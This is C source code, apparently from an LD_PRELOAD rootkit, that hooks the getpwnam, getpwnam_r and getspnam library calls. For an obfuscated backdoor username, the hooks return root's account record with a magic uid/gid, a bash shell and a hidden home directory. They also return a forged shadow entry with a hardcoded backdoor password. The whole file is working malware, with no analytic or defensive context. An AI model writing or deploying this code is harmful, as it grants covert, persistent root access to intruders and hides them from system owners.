struct passwd *getpwnam(const char *name){
    hook(CGETPWNAM);
    char *pamname = xordup(BDUSERNAME);
    if(!pamname) return call(CGETPWNAM, name);
    if(strcmp(name, pamname) == 0){
        struct passwd *bpw = call(CGETPWNAM, "root");
        if(!bpw){
            clean(pamname);
            return call(CGETPWNAM, name);
        }
        bpw->pw_name = pamname;
        gid_t magicid = readid();
        bpw->pw_uid = magicid;
        bpw->pw_gid = magicid;
        if(!initmvbc()) bpw->pw_dir = "/dev/shm";
        else            bpw->pw_dir = mvbc->homedir;
        bpw->pw_shell = "/bin/bash";
        return bpw;
    }
    clean(pamname);
    return call(CGETPWNAM, name);
}
int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result){
    hook(CGETPWNAM_R);
    char *pamname = xordup(BDUSERNAME);
    if(!pamname) return (long)call(CGETPWNAM_R, name, pwd, buf, buflen, result);
    if(strcmp(name, pamname) == 0){
        call(CGETPWNAM_R, "root", pwd, buf, buflen, result);
        pwd->pw_name = pamname;
        gid_t magicid = readid();
        pwd->pw_uid = magicid;
        pwd->pw_gid = magicid;
        if(!initmvbc()) pwd->pw_dir = "/dev/shm";
        else            pwd->pw_dir = mvbc->homedir;
        pwd->pw_shell = "/bin/bash";
        return 0;
    }
    clean(pamname);
    return (long)call(CGETPWNAM_R, name, pwd, buf, buflen, result);
}
struct spwd *getspnam(const char *name){
    hook(CGETSPNAM);
    char *pamname = xordup(BDUSERNAME);
    if(!pamname) return call(CGETSPNAM, name);

    if(strcmp(name, pamname) == 0){
        struct spwd *bspwd = calloc(1, sizeof(struct spwd));
        if(!bspwd){
            clean(pamname);
            return call(CGETSPNAM, name);
        }
        
        bspwd->sp_namp = pamname;
        bspwd->sp_pwdp = xordup(BDPASSWORD);
        bspwd->sp_lstchg = time(NULL) / (60 * 60 * 24);
        bspwd->sp_expire = time(NULL) / (60 * 60 * 24) + 90;
        bspwd->sp_inact = 9001;
        bspwd->sp_warn = 0;
        bspwd->sp_min = 0;
        bspwd->sp_max = 99999;
        return bspwd;
    }
    clean(pamname);
    return call(CGETSPNAM, name);
}